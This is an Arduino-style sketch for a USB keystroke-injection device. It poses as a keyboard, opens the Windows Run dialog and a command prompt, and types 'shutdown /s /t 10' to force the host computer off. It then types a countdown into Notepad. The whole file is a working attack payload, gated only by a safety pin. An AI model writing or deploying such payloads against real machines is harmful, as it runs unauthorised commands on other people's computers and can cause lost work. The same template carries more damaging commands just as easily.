#include "USB.h"
#include "USBHID.h"
#include "USBHIDKeyboard.h"
USBHIDKeyboard Keyboard;

const int safetyPin = 3; 

void setup() {
  pinMode(safetyPin, INPUT_PULLUP);
  while (digitalRead(safetyPin) == LOW) {
    delay(100); 
  }
  USB.begin();
  Keyboard.begin();

  
  delay(5000); 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  delay(600);
  Keyboard.print("shutdown /s /t 10");
  Keyboard.write(KEY_RETURN);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("notepad");
  Keyboard.write(KEY_RETURN);
  delay(800);

  for (int i = 10; i > 0; i--) {
    Keyboard.print(String(i) + "... ");
    delay(1000);
  }
}

void loop() {
}